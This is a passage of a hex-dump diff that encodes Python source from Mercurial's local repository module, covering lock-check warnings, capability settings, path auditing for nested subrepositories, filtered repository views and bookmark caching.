-00011180: 2020 2020 2020 2020 2020 2020 2023 2063               # c
-00011190: 6865 636b 2069 6620 6974 206d 6967 6874  heck if it might
-000111a0: 2068 6176 6520 636f 6d65 2066 726f 6d20   have come from 
-000111b0: 6461 6d61 6765 6420 6469 7273 7461 7465  damaged dirstate
+0000cc40: 2023 2072 6573 7420 6f66 2076 6673 2066   # rest of vfs f
+0000cc50: 696c 6573 2061 7265 2063 6f76 6572 6564  iles are covered
+0000cc60: 2062 7920 2777 6c6f 636b 270a 2020 2020   by 'wlock'.    
+0000cc70: 2020 2020 2020 2020 2020 2020 230a 2020              #.  
+0000cc80: 2020 2020 2020 2020 2020 2020 2020 2320                # 
+0000cc90: 6578 636c 7564 6520 7370 6563 6961 6c20  exclude special 
+0000cca0: 6669 6c65 730a 2020 2020 2020 2020 2020  files.          
+0000ccb0: 2020 2020 2020 666f 7220 7072 6566 6978        for prefix
+0000ccc0: 2069 6e20 7365 6c66 2e5f 776c 6f63 6b66   in self._wlockf
+0000ccd0: 7265 6570 7265 6669 783a 0a20 2020 2020  reeprefix:.     
+0000cce0: 2020 2020 2020 2020 2020 2020 2020 2069                 i
+0000ccf0: 6620 7061 7468 2e73 7461 7274 7377 6974  f path.startswit
+0000cd00: 6828 7072 6566 6978 293a 0a20 2020 2020  h(prefix):.     
+0000cd10: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0000cd20: 2020 2072 6574 7572 6e0a 2020 2020 2020     return.      
+0000cd30: 2020 2020 2020 2020 2020 7265 706f 2e75            repo.u
+0000cd40: 692e 6465 7665 6c77 6172 6e28 0a20 2020  i.develwarn(.   
+0000cd50: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0000cd60: 2062 2777 7269 7465 2077 6974 6820 6e6f   b'write with no
+0000cd70: 2077 6c6f 636b 3a20 2225 7322 2720 2520   wlock: "%s"' % 
+0000cd80: 7061 7468 2c0a 2020 2020 2020 2020 2020  path,.          
+0000cd90: 2020 2020 2020 2020 2020 7374 6163 6b6c            stackl
+0000cda0: 6576 656c 3d33 2c0a 2020 2020 2020 2020  evel=3,.        
+0000cdb0: 2020 2020 2020 2020 2020 2020 636f 6e66              conf
+0000cdc0: 6967 3d62 2763 6865 636b 2d6c 6f63 6b73  ig=b'check-locks
+0000cdd0: 272c 0a20 2020 2020 2020 2020 2020 2020  ',.             
+0000cde0: 2020 2029 0a20 2020 2020 2020 2020 2020     ).           
+0000cdf0: 2072 6574 7572 6e20 7265 740a 0a20 2020   return ret..   
+0000ce00: 2020 2020 2072 6574 7572 6e20 6368 6563       return chec
+0000ce10: 6b76 6673 0a0a 2020 2020 6465 6620 5f67  kvfs..    def _g
+0000ce20: 6574 7376 6673 7761 7264 2873 656c 662c  etsvfsward(self,
+0000ce30: 206f 7269 6766 756e 6329 3a0a 2020 2020   origfunc):.    
+0000ce40: 2020 2020 2222 2262 7569 6c64 2061 2077      """build a w
+0000ce50: 6172 6420 666f 7220 7365 6c66 2e73 7666  ard for self.svf
+0000ce60: 7322 2222 0a20 2020 2020 2020 2072 7265  s""".        rre
+0000ce70: 6620 3d20 7765 616b 7265 662e 7265 6628  f = weakref.ref(
+0000ce80: 7365 6c66 290a 0a20 2020 2020 2020 2064  self)..        d
+0000ce90: 6566 2063 6865 636b 7376 6673 2870 6174  ef checksvfs(pat
+0000cea0: 682c 206d 6f64 653d 4e6f 6e65 293a 0a20  h, mode=None):. 
+0000ceb0: 2020 2020 2020 2020 2020 2072 6574 203d             ret =
+0000cec0: 206f 7269 6766 756e 6328 7061 7468 2c20   origfunc(path, 
+0000ced0: 6d6f 6465 3d6d 6f64 6529 0a20 2020 2020  mode=mode).     
+0000cee0: 2020 2020 2020 2072 6570 6f20 3d20 7272         repo = rr
+0000cef0: 6566 2829 0a20 2020 2020 2020 2020 2020  ef().           
+0000cf00: 2069 6620 7265 706f 2069 7320 4e6f 6e65   if repo is None
+0000cf10: 206f 7220 6e6f 7420 7574 696c 2e73 6166   or not util.saf
+0000cf20: 6568 6173 6174 7472 2872 6570 6f2c 2062  ehasattr(repo, b
+0000cf30: 275f 6c6f 636b 7265 6627 293a 0a20 2020  '_lockref'):.   
+0000cf40: 2020 2020 2020 2020 2020 2020 2072 6574               ret
+0000cf50: 7572 6e0a 2020 2020 2020 2020 2020 2020  urn.            
+0000cf60: 6966 206d 6f64 6520 696e 2028 4e6f 6e65  if mode in (None
+0000cf70: 2c20 6227 7227 2c20 6227 7262 2729 3a0a  , b'r', b'rb'):.
+0000cf80: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0000cf90: 7265 7475 726e 0a20 2020 2020 2020 2020  return.         
+0000cfa0: 2020 2069 6620 7061 7468 2e73 7461 7274     if path.start
+0000cfb0: 7377 6974 6828 7265 706f 2e73 6861 7265  swith(repo.share
+0000cfc0: 6470 6174 6829 3a0a 2020 2020 2020 2020  dpath):.        
+0000cfd0: 2020 2020 2020 2020 2320 7472 756e 6361          # trunca
+0000cfe0: 7465 206e 616d 6520 7265 6c61 7469 7665  te name relative
+0000cff0: 2074 6f20 7468 6520 7265 706f 7369 746f   to the reposito
+0000d000: 7279 2028 2e68 6729 0a20 2020 2020 2020  ry (.hg).       
+0000d010: 2020 2020 2020 2020 2070 6174 6820 3d20           path = 
+0000d020: 7061 7468 5b6c 656e 2872 6570 6f2e 7368  path[len(repo.sh
+0000d030: 6172 6564 7061 7468 2920 2b20 3120 3a5d  aredpath) + 1 :]
+0000d040: 0a20 2020 2020 2020 2020 2020 2069 6620  .            if 
+0000d050: 7265 706f 2e5f 6375 7272 656e 746c 6f63  repo._currentloc
+0000d060: 6b28 7265 706f 2e5f 6c6f 636b 7265 6629  k(repo._lockref)
+0000d070: 2069 7320 4e6f 6e65 3a0a 2020 2020 2020   is None:.      
+0000d080: 2020 2020 2020 2020 2020 7265 706f 2e75            repo.u
+0000d090: 692e 6465 7665 6c77 6172 6e28 0a20 2020  i.develwarn(.   
+0000d0a0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0000d0b0: 2062 2777 7269 7465 2077 6974 6820 6e6f   b'write with no
+0000d0c0: 206c 6f63 6b3a 2022 2573 2227 2025 2070   lock: "%s"' % p
+0000d0d0: 6174 682c 2073 7461 636b 6c65 7665 6c3d  ath, stacklevel=
+0000d0e0: 340a 2020 2020 2020 2020 2020 2020 2020  4.              
+0000d0f0: 2020 290a 2020 2020 2020 2020 2020 2020    ).            
+0000d100: 7265 7475 726e 2072 6574 0a0a 2020 2020  return ret..    
+0000d110: 2020 2020 7265 7475 726e 2063 6865 636b      return check
+0000d120: 7376 6673 0a0a 2020 2020 6465 6620 636c  svfs..    def cl
+0000d130: 6f73 6528 7365 6c66 293a 0a20 2020 2020  ose(self):.     
+0000d140: 2020 2073 656c 662e 5f77 7269 7465 6361     self._writeca
+0000d150: 6368 6573 2829 0a0a 2020 2020 6465 6620  ches()..    def 
+0000d160: 5f77 7269 7465 6361 6368 6573 2873 656c  _writecaches(sel
+0000d170: 6629 3a0a 2020 2020 2020 2020 6966 2073  f):.        if s
+0000d180: 656c 662e 5f72 6576 6272 616e 6368 6361  elf._revbranchca
+0000d190: 6368 653a 0a20 2020 2020 2020 2020 2020  che:.           
+0000d1a0: 2073 656c 662e 5f72 6576 6272 616e 6368   self._revbranch
+0000d1b0: 6361 6368 652e 7772 6974 6528 290a 0a20  cache.write().. 
+0000d1c0: 2020 2064 6566 205f 7265 7374 7269 6374     def _restrict
+0000d1d0: 6361 7061 6269 6c69 7469 6573 2873 656c  capabilities(sel
+0000d1e0: 662c 2063 6170 7329 3a0a 2020 2020 2020  f, caps):.      
+0000d1f0: 2020 6966 2073 656c 662e 7569 2e63 6f6e    if self.ui.con
+0000d200: 6669 6762 6f6f 6c28 6227 6578 7065 7269  figbool(b'experi
+0000d210: 6d65 6e74 616c 272c 2062 2762 756e 646c  mental', b'bundl
+0000d220: 6532 2d61 6476 6572 7469 7365 2729 3a0a  e2-advertise'):.
+0000d230: 2020 2020 2020 2020 2020 2020 6361 7073              caps
+0000d240: 203d 2073 6574 2863 6170 7329 0a20 2020   = set(caps).   
+0000d250: 2020 2020 2020 2020 2063 6170 7362 6c6f           capsblo
+0000d260: 6220 3d20 6275 6e64 6c65 322e 656e 636f  b = bundle2.enco
+0000d270: 6465 6361 7073 280a 2020 2020 2020 2020  decaps(.        
+0000d280: 2020 2020 2020 2020 6275 6e64 6c65 322e          bundle2.
+0000d290: 6765 7472 6570 6f63 6170 7328 7365 6c66  getrepocaps(self
+0000d2a0: 2c20 726f 6c65 3d62 2763 6c69 656e 7427  , role=b'client'
+0000d2b0: 290a 2020 2020 2020 2020 2020 2020 290a  ).            ).
+0000d2c0: 2020 2020 2020 2020 2020 2020 6361 7073              caps
+0000d2d0: 2e61 6464 2862 2762 756e 646c 6532 3d27  .add(b'bundle2='
+0000d2e0: 202b 2075 726c 7265 712e 7175 6f74 6528   + urlreq.quote(
+0000d2f0: 6361 7073 626c 6f62 2929 0a20 2020 2020  capsblob)).     
+0000d300: 2020 2069 6620 7365 6c66 2e75 692e 636f     if self.ui.co
+0000d310: 6e66 6967 626f 6f6c 2862 2765 7870 6572  nfigbool(b'exper
+0000d320: 696d 656e 7461 6c27 2c20 6227 6e61 7272  imental', b'narr
+0000d330: 6f77 2729 3a0a 2020 2020 2020 2020 2020  ow'):.          
+0000d340: 2020 6361 7073 2e61 6464 2877 6972 6570    caps.add(wirep
+0000d350: 726f 746f 7479 7065 732e 4e41 5252 4f57  rototypes.NARROW
+0000d360: 4341 5029 0a20 2020 2020 2020 2072 6574  CAP).        ret
+0000d370: 7572 6e20 6361 7073 0a0a 2020 2020 2320  urn caps..    # 
+0000d380: 446f 6e27 7420 6361 6368 6520 6175 6469  Don't cache audi
+0000d390: 746f 722f 6e6f 6673 6175 6469 746f 722c  tor/nofsauditor,
+0000d3a0: 206f 7220 796f 7527 6c6c 2065 6e64 2075   or you'll end u
+0000d3b0: 7020 7769 7468 2072 6566 6572 656e 6365  p with reference
+0000d3c0: 2063 7963 6c65 3a0a 2020 2020 2320 7365   cycle:.    # se
+0000d3d0: 6c66 202d 3e20 6175 6469 746f 7220 2d3e  lf -> auditor ->
+0000d3e0: 2073 656c 662e 5f63 6865 636b 6e65 7374   self._checknest
+0000d3f0: 6564 202d 3e20 7365 6c66 0a0a 2020 2020  ed -> self..    
+0000d400: 4070 726f 7065 7274 790a 2020 2020 6465  @property.    de
+0000d410: 6620 6175 6469 746f 7228 7365 6c66 293a  f auditor(self):
+0000d420: 0a20 2020 2020 2020 2023 2054 6869 7320  .        # This 
+0000d430: 6973 206f 6e6c 7920 7573 6564 2062 7920  is only used by 
+0000d440: 636f 6e74 6578 742e 776f 726b 696e 6763  context.workingc
+0000d450: 7478 2e6d 6174 6368 2069 6e20 6f72 6465  tx.match in orde
+0000d460: 7220 746f 0a20 2020 2020 2020 2023 2064  r to.        # d
+0000d470: 6574 6563 7420 6669 6c65 7320 696e 2073  etect files in s
+0000d480: 7562 7265 706f 732e 0a20 2020 2020 2020  ubrepos..       
+0000d490: 2072 6574 7572 6e20 7061 7468 7574 696c   return pathutil
+0000d4a0: 2e70 6174 6861 7564 6974 6f72 2873 656c  .pathauditor(sel
+0000d4b0: 662e 726f 6f74 2c20 6361 6c6c 6261 636b  f.root, callback
+0000d4c0: 3d73 656c 662e 5f63 6865 636b 6e65 7374  =self._checknest
+0000d4d0: 6564 290a 0a20 2020 2040 7072 6f70 6572  ed)..    @proper
+0000d4e0: 7479 0a20 2020 2064 6566 206e 6f66 7361  ty.    def nofsa
+0000d4f0: 7564 6974 6f72 2873 656c 6629 3a0a 2020  uditor(self):.  
+0000d500: 2020 2020 2020 2320 5468 6973 2069 7320        # This is 
+0000d510: 6f6e 6c79 2075 7365 6420 6279 2063 6f6e  only used by con
+0000d520: 7465 7874 2e62 6173 6563 7478 2e6d 6174  text.basectx.mat
+0000d530: 6368 2069 6e20 6f72 6465 7220 746f 2064  ch in order to d
+0000d540: 6574 6563 740a 2020 2020 2020 2020 2320  etect.        # 
+0000d550: 6669 6c65 7320 696e 2073 7562 7265 706f  files in subrepo
+0000d560: 732e 0a20 2020 2020 2020 2072 6574 7572  s..        retur
+0000d570: 6e20 7061 7468 7574 696c 2e70 6174 6861  n pathutil.patha
+0000d580: 7564 6974 6f72 280a 2020 2020 2020 2020  uditor(.        
+0000d590: 2020 2020 7365 6c66 2e72 6f6f 742c 2063      self.root, c
+0000d5a0: 616c 6c62 6163 6b3d 7365 6c66 2e5f 6368  allback=self._ch
+0000d5b0: 6563 6b6e 6573 7465 642c 2072 6561 6c66  ecknested, realf
+0000d5c0: 733d 4661 6c73 652c 2063 6163 6865 643d  s=False, cached=
+0000d5d0: 5472 7565 0a20 2020 2020 2020 2029 0a0a  True.        )..
+0000d5e0: 2020 2020 6465 6620 5f63 6865 636b 6e65      def _checkne
+0000d5f0: 7374 6564 2873 656c 662c 2070 6174 6829  sted(self, path)
+0000d600: 3a0a 2020 2020 2020 2020 2222 2244 6574  :.        """Det
+0000d610: 6572 6d69 6e65 2069 6620 7061 7468 2069  ermine if path i
+0000d620: 7320 6120 6c65 6761 6c20 6e65 7374 6564  s a legal nested
+0000d630: 2072 6570 6f73 6974 6f72 792e 2222 220a   repository.""".
+0000d640: 2020 2020 2020 2020 6966 206e 6f74 2070          if not p
+0000d650: 6174 682e 7374 6172 7473 7769 7468 2873  ath.startswith(s
+0000d660: 656c 662e 726f 6f74 293a 0a20 2020 2020  elf.root):.     
+0000d670: 2020 2020 2020 2072 6574 7572 6e20 4661         return Fa
+0000d680: 6c73 650a 2020 2020 2020 2020 7375 6270  lse.        subp
+0000d690: 6174 6820 3d20 7061 7468 5b6c 656e 2873  ath = path[len(s
+0000d6a0: 656c 662e 726f 6f74 2920 2b20 3120 3a5d  elf.root) + 1 :]
+0000d6b0: 0a20 2020 2020 2020 206e 6f72 6d73 7562  .        normsub
+0000d6c0: 7061 7468 203d 2075 7469 6c2e 7063 6f6e  path = util.pcon
+0000d6d0: 7665 7274 2873 7562 7061 7468 290a 0a20  vert(subpath).. 
+0000d6e0: 2020 2020 2020 2023 2058 5858 3a20 4368         # XXX: Ch
+0000d6f0: 6563 6b69 6e67 2061 6761 696e 7374 2074  ecking against t
+0000d700: 6865 2063 7572 7265 6e74 2077 6f72 6b69  he current worki
+0000d710: 6e67 2063 6f70 7920 6973 2077 726f 6e67  ng copy is wrong
+0000d720: 2069 6e0a 2020 2020 2020 2020 2320 7468   in.        # th
+0000d730: 6520 7365 6e73 6520 7468 6174 2069 7420  e sense that it 
+0000d740: 6361 6e20 7265 6a65 6374 2074 6869 6e67  can reject thing
+0000d750: 7320 6c69 6b65 0a20 2020 2020 2020 2023  s like.        #
+0000d760: 0a20 2020 2020 2020 2023 2020 2024 2068  .        #   $ h
+0000d770: 6720 6361 7420 2d72 2031 3020 7375 622f  g cat -r 10 sub/
+0000d780: 782e 7478 740a 2020 2020 2020 2020 230a  x.txt.        #.
+0000d790: 2020 2020 2020 2020 2320 6966 2073 7562          # if sub
+0000d7a0: 2f20 6973 206e 6f20 6c6f 6e67 6572 2061  / is no longer a
+0000d7b0: 2073 7562 7265 706f 7369 746f 7279 2069   subrepository i
+0000d7c0: 6e20 7468 6520 776f 726b 696e 6720 636f  n the working co
+0000d7d0: 7079 0a20 2020 2020 2020 2023 2070 6172  py.        # par
+0000d7e0: 656e 7420 7265 7669 7369 6f6e 2e0a 2020  ent revision..  
+0000d7f0: 2020 2020 2020 230a 2020 2020 2020 2020        #.        
+0000d800: 2320 486f 7765 7665 722c 2069 7420 6361  # However, it ca
+0000d810: 6e20 6f66 2063 6f75 7273 6520 616c 736f  n of course also
+0000d820: 2061 6c6c 6f77 2074 6869 6e67 7320 7468   allow things th
+0000d830: 6174 2077 6f75 6c64 2068 6176 650a 2020  at would have.  
+0000d840: 2020 2020 2020 2320 6265 656e 2072 656a        # been rej
+0000d850: 6563 7465 6420 6265 666f 7265 2c20 7375  ected before, su
+0000d860: 6368 2061 7320 7468 6520 6162 6f76 6520  ch as the above 
+0000d870: 6361 7420 636f 6d6d 616e 6420 6966 2073  cat command if s
+0000d880: 7562 2f0a 2020 2020 2020 2020 2320 6973  ub/.        # is
+0000d890: 2061 2073 7562 7265 706f 7369 746f 7279   a subrepository
+0000d8a0: 206e 6f77 2c20 6275 7420 7761 7320 6120   now, but was a 
+0000d8b0: 6e6f 726d 616c 2064 6972 6563 746f 7279  normal directory
+0000d8c0: 2062 6566 6f72 652e 0a20 2020 2020 2020   before..       
+0000d8d0: 2023 2054 6865 206f 6c64 2070 6174 6820   # The old path 
+0000d8e0: 6175 6469 746f 7220 776f 756c 6420 6861  auditor would ha
+0000d8f0: 7665 2072 656a 6563 7465 6420 6279 206d  ve rejected by m
+0000d900: 6973 7461 6b65 2073 696e 6365 2069 740a  istake since it.
+0000d910: 2020 2020 2020 2020 2320 7061 6e69 6373          # panics
+0000d920: 2077 6865 6e20 6974 2073 6565 7320 7375   when it sees su
+0000d930: 622f 2e68 672f 2e0a 2020 2020 2020 2020  b/.hg/..        
+0000d940: 230a 2020 2020 2020 2020 2320 416c 6c20  #.        # All 
+0000d950: 696e 2061 6c6c 2c20 6368 6563 6b69 6e67  in all, checking
+0000d960: 2061 6761 696e 7374 2074 6865 2077 6f72   against the wor
+0000d970: 6b69 6e67 2063 6f70 7920 7365 656d 7320  king copy seems 
+0000d980: 7365 6e73 6962 6c65 0a20 2020 2020 2020  sensible.       
+0000d990: 2023 2073 696e 6365 2077 6520 7761 6e74   # since we want
+0000d9a0: 2074 6f20 7072 6576 656e 7420 6163 6365   to prevent acce
+0000d9b0: 7373 2074 6f20 6e65 7374 6564 2072 6570  ss to nested rep
+0000d9c0: 6f73 6974 6f72 6965 7320 6f6e 0a20 2020  ositories on.   
+0000d9d0: 2020 2020 2023 2074 6865 2066 696c 6573       # the files
+0000d9e0: 7973 7465 6d20 2a6e 6f77 2a2e 0a20 2020  ystem *now*..   
+0000d9f0: 2020 2020 2063 7478 203d 2073 656c 665b       ctx = self[
+0000da00: 4e6f 6e65 5d0a 2020 2020 2020 2020 7061  None].        pa
+0000da10: 7274 7320 3d20 7574 696c 2e73 706c 6974  rts = util.split
+0000da20: 7061 7468 2873 7562 7061 7468 290a 2020  path(subpath).  
+0000da30: 2020 2020 2020 7768 696c 6520 7061 7274        while part
+0000da40: 733a 0a20 2020 2020 2020 2020 2020 2070  s:.            p
+0000da50: 7265 6669 7820 3d20 6227 2f27 2e6a 6f69  refix = b'/'.joi
+0000da60: 6e28 7061 7274 7329 0a20 2020 2020 2020  n(parts).       
+0000da70: 2020 2020 2069 6620 7072 6566 6978 2069       if prefix i
+0000da80: 6e20 6374 782e 7375 6273 7461 7465 3a0a  n ctx.substate:.
+0000da90: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0000daa0: 6966 2070 7265 6669 7820 3d3d 206e 6f72  if prefix == nor
+0000dab0: 6d73 7562 7061 7468 3a0a 2020 2020 2020  msubpath:.      
+0000dac0: 2020 2020 2020 2020 2020 2020 2020 7265                re
+0000dad0: 7475 726e 2054 7275 650a 2020 2020 2020  turn True.      
+0000dae0: 2020 2020 2020 2020 2020 656c 7365 3a0a            else:.
+0000daf0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0000db00: 2020 2020 7375 6220 3d20 6374 782e 7375      sub = ctx.su
+0000db10: 6228 7072 6566 6978 290a 2020 2020 2020  b(prefix).      
+0000db20: 2020 2020 2020 2020 2020 2020 2020 7265                re
+0000db30: 7475 726e 2073 7562 2e63 6865 636b 6e65  turn sub.checkne
+0000db40: 7374 6564 2873 7562 7061 7468 5b6c 656e  sted(subpath[len
+0000db50: 2870 7265 6669 7829 202b 2031 203a 5d29  (prefix) + 1 :])
+0000db60: 0a20 2020 2020 2020 2020 2020 2065 6c73  .            els
+0000db70: 653a 0a20 2020 2020 2020 2020 2020 2020  e:.             
+0000db80: 2020 2070 6172 7473 2e70 6f70 2829 0a20     parts.pop(). 
+0000db90: 2020 2020 2020 2072 6574 7572 6e20 4661         return Fa
+0000dba0: 6c73 650a 0a20 2020 2064 6566 2070 6565  lse..    def pee
+0000dbb0: 7228 7365 6c66 2c20 7061 7468 3d4e 6f6e  r(self, path=Non
+0000dbc0: 6529 3a0a 2020 2020 2020 2020 7265 7475  e):.        retu
+0000dbd0: 726e 206c 6f63 616c 7065 6572 2873 656c  rn localpeer(sel
+0000dbe0: 662c 2070 6174 683d 7061 7468 2920 2023  f, path=path)  #
+0000dbf0: 206e 6f74 2063 6163 6865 6420 746f 2061   not cached to a
+0000dc00: 766f 6964 2072 6566 6572 656e 6365 2063  void reference c
+0000dc10: 7963 6c65 0a0a 2020 2020 6465 6620 756e  ycle..    def un
+0000dc20: 6669 6c74 6572 6564 2873 656c 6629 3a0a  filtered(self):.
+0000dc30: 2020 2020 2020 2020 2222 2252 6574 7572          """Retur
+0000dc40: 6e20 756e 6669 6c74 6572 6564 2076 6572  n unfiltered ver
+0000dc50: 7369 6f6e 206f 6620 7468 6520 7265 706f  sion of the repo
+0000dc60: 7369 746f 7279 0a0a 2020 2020 2020 2020  sitory..        
+0000dc70: 496e 7465 6e64 6564 2074 6f20 6265 206f  Intended to be o
+0000dc80: 7665 7277 7269 7474 656e 2062 7920 6669  verwritten by fi
+0000dc90: 6c74 6572 6564 2072 6570 6f2e 2222 220a  ltered repo.""".
+0000dca0: 2020 2020 2020 2020 7265 7475 726e 2073          return s
+0000dcb0: 656c 660a 0a20 2020 2064 6566 2066 696c  elf..    def fil
+0000dcc0: 7465 7265 6428 7365 6c66 2c20 6e61 6d65  tered(self, name
+0000dcd0: 2c20 7669 7369 6269 6c69 7479 6578 6365  , visibilityexce
+0000dce0: 7074 696f 6e73 3d4e 6f6e 6529 3a0a 2020  ptions=None):.  
+0000dcf0: 2020 2020 2020 2222 2252 6574 7572 6e20        """Return 
+0000dd00: 6120 6669 6c74 6572 6564 2076 6572 7369  a filtered versi
+0000dd10: 6f6e 206f 6620 6120 7265 706f 7369 746f  on of a reposito
+0000dd20: 7279 0a0a 2020 2020 2020 2020 5468 6520  ry..        The 
+0000dd30: 606e 616d 6560 2070 6172 616d 6574 6572  `name` parameter
+0000dd40: 2069 7320 7468 6520 6964 656e 7469 6669   is the identifi
+0000dd50: 6572 206f 6620 7468 6520 7265 7175 6573  er of the reques
+0000dd60: 7465 6420 7669 6577 2e20 5468 6973 0a20  ted view. This. 
+0000dd70: 2020 2020 2020 2077 696c 6c20 7265 7475         will retu
+0000dd80: 726e 2061 2072 6570 6f76 6965 7720 6f62  rn a repoview ob
+0000dd90: 6a65 6374 2073 6574 2022 6578 6163 746c  ject set "exactl
+0000dda0: 7922 2074 6f20 7468 6520 7370 6563 6966  y" to the specif
+0000ddb0: 6965 6420 7669 6577 2e0a 0a20 2020 2020  ied view...     
+0000ddc0: 2020 2054 6869 7320 6675 6e63 7469 6f6e     This function
+0000ddd0: 2064 6f65 7320 6e6f 7420 6170 706c 7920   does not apply 
+0000dde0: 7265 6375 7273 6976 6520 6669 6c74 6572  recursive filter
+0000ddf0: 696e 6720 746f 2061 2072 6570 6f73 6974  ing to a reposit
+0000de00: 6f72 792e 2046 6f72 0a20 2020 2020 2020  ory. For.       
+0000de10: 2065 7861 6d70 6c65 2063 616c 6c69 6e67   example calling
+0000de20: 2060 7265 706f 2e66 696c 7465 7265 6428   `repo.filtered(
+0000de30: 2273 6572 7665 6422 2960 2077 696c 6c20  "served")` will 
+0000de40: 7265 7475 726e 2061 2072 6570 6f76 6965  return a repovie
+0000de50: 7720 7573 696e 670a 2020 2020 2020 2020  w using.        
+0000de60: 7468 6520 2273 6572 7665 6422 2076 6965  the "served" vie
+0000de70: 772c 2072 6567 6172 646c 6573 7320 6f66  w, regardless of
+0000de80: 2074 6865 2069 6e69 7469 616c 2076 6965   the initial vie
+0000de90: 7720 7573 6564 2062 7920 6072 6570 6f60  w used by `repo`
+0000dea0: 2e0a 0a20 2020 2020 2020 2049 6e20 6f74  ...        In ot
+0000deb0: 6865 7220 776f 7264 2c20 7468 6572 6520  her word, there 
+0000dec0: 6973 2061 6c77 6179 7320 6f6e 6c79 206f  is always only o
+0000ded0: 6e65 206c 6576 656c 206f 6620 6072 6570  ne level of `rep
+0000dee0: 6f76 6965 7760 2022 6669 6c74 6572 696e  oview` "filterin
+0000def0: 6722 2e0a 2020 2020 2020 2020 2222 220a  g"..        """.
+0000df00: 2020 2020 2020 2020 6966 2073 656c 662e          if self.
+0000df10: 5f65 7874 7261 6669 6c74 6572 6964 2069  _extrafilterid i
+0000df20: 7320 6e6f 7420 4e6f 6e65 2061 6e64 2062  s not None and b
+0000df30: 2725 2720 6e6f 7420 696e 206e 616d 653a  '%' not in name:
+0000df40: 0a20 2020 2020 2020 2020 2020 206e 616d  .            nam
+0000df50: 6520 3d20 6e61 6d65 202b 2062 2725 2720  e = name + b'%' 
+0000df60: 2b20 7365 6c66 2e5f 6578 7472 6166 696c  + self._extrafil
+0000df70: 7465 7269 640a 0a20 2020 2020 2020 2063  terid..        c
+0000df80: 6c73 203d 2072 6570 6f76 6965 772e 6e65  ls = repoview.ne
+0000df90: 7774 7970 6528 7365 6c66 2e75 6e66 696c  wtype(self.unfil
+0000dfa0: 7465 7265 6428 292e 5f5f 636c 6173 735f  tered().__class_
+0000dfb0: 5f29 0a20 2020 2020 2020 2072 6574 7572  _).        retur
+0000dfc0: 6e20 636c 7328 7365 6c66 2c20 6e61 6d65  n cls(self, name
+0000dfd0: 2c20 7669 7369 6269 6c69 7479 6578 6365  , visibilityexce
+0000dfe0: 7074 696f 6e73 290a 0a20 2020 2040 6d69  ptions)..    @mi
+0000dff0: 7865 6472 6570 6f73 746f 7265 6361 6368  xedrepostorecach
+0000e000: 6528 0a20 2020 2020 2020 2028 6227 626f  e(.        (b'bo
+0000e010: 6f6b 6d61 726b 7327 2c20 6227 706c 6169  okmarks', b'plai
+0000e020: 6e27 292c 0a20 2020 2020 2020 2028 6227  n'),.        (b'
+0000e030: 626f 6f6b 6d61 726b 732e 6375 7272 656e  bookmarks.curren
+0000e040: 7427 2c20 6227 706c 6169 6e27 292c 0a20  t', b'plain'),. 
+0000e050: 2020 2020 2020 2028 6227 626f 6f6b 6d61         (b'bookma
+0000e060: 726b 7327 2c20 6227 2729 2c0a 2020 2020  rks', b''),.    
+0000e070: 2020 2020 2862 2730 3063 6861 6e67 656c      (b'00changel
+0000e080: 6f67 2e69 272c 2062 2727 292c 0a20 2020  og.i', b''),.   
+0000e090: 2029 0a20 2020 2064 6566 205f 626f 6f6b   ).    def _book
+0000e0a0: 6d61 726b 7328 7365 6c66 293a 0a20 2020  marks(self):.   
+0000e0b0: 2020 2020 2023 2053 696e 6365 2074 6865       # Since the
+0000e0c0: 206d 756c 7469 706c 6520 6669 6c65 7320   multiple files 
+0000e0d0: 696e 766f 6c76 6564 2069 6e20 7468 6520  involved in the 
+0000e0e0: 7472 616e 7361 6374 696f 6e20 6361 6e6e  transaction cann
+0000e0f0: 6f74 2062 650a 2020 2020 2020 2020 2320  ot be.        # 
+0000e100: 7772 6974 7465 6e20 6174 6f6d 6963 616c  written atomical
+0000e110: 6c79 2028 7769 7468 2063 7572 7265 6e74  ly (with current
+0000e120: 2072 6570 6f73 6974 6f72 7920 666f 726d   repository form
+0000e130: 6174 292c 2074 6865 7265 2069 7320 6120  at), there is a 
+0000e140: 7261 6365 0a20 2020 2020 2020 2023 2063  race.        # c
+0000e150: 6f6e 6469 7469 6f6e 2068 6572 652e 0a20  ondition here.. 
+0000e160: 2020 2020 2020 2023 0a20 2020 2020 2020         #.       
+0000e170: 2023 2031 2920 6368 616e 6765 6c6f 6720   # 1) changelog 
+0000e180: 636f 6e74 656e 7420 4120 6973 2072 6561  content A is rea
+0000e190: 640a 2020 2020 2020 2020 2320 3229 206f  d.        # 2) o
+0000e1a0: 7574 7369 6465 2074 7261 6e73 6163 7469  utside transacti
+0000e1b0: 6f6e 2075 7064 6174 6520 6368 616e 6765  on update change
+0000e1c0: 6c6f 6720 746f 2063 6f6e 7465 6e74 2042  log to content B
+0000e1d0: 0a20 2020 2020 2020 2023 2033 2920 6f75  .        # 3) ou
+0000e1e0: 7473 6964 6520 7472 616e 7361 6374 696f  tside transactio
+0000e1f0: 6e20 7570 6461 7465 2062 6f6f 6b6d 6172  n update bookmar
+0000e200: 6b20 6669 6c65 2072 6566 6572 7269 6e67  k file referring
+0000e210: 2074 6f20 636f 6e74 656e 7420 420a 2020   to content B.  
+0000e220: 2020 2020 2020 2320 3429 2062 6f6f 6b6d        # 4) bookm
+0000e230: 6172 6b73 2066 696c 6520 636f 6e74 656e  arks file conten
+0000e240: 7420 6973 2072 6561 6420 616e 6420 6669  t is read and fi
+0000e250: 6c74 6572 6564 2061 6761 696e 7374 2063  ltered against c
+0000e260: 6861 6e67 656c 6f67 2d41 0a20 2020 2020  hangelog-A.     
+0000e270: 2020 2023 0a20 2020 2020 2020 2023 2057     #.        # W
+0000e280: 6865 6e20 7468 6973 2068 6170 7065 6e73  hen this happens
+0000e290: 2c20 626f 6f6b 6d61 726b 7320 6167 6169  , bookmarks agai
+0000e2a0: 6e73 7420 6e6f 6465 7320 6d69 7373 696e  nst nodes missin
+0000e2b0: 6720 6672 6f6d 2041 2061 7265 2064 726f  g from A are dro
+0000e2c0: 7070 6564 2e0a 2020 2020 2020 2020 230a  pped..        #.
+0000e2d0: 2020 2020 2020 2020 2320 4861 7669 6e67          # Having
+0000e2e0: 2074 6869 7320 6861 7070 656e 696e 6720   this happening 
+0000e2f0: 6475 7269 6e67 2072 6561 6420 6973 206e  during read is n
+0000e300: 6f74 2067 7265 6174 2c20 6275 7420 6974  ot great, but it
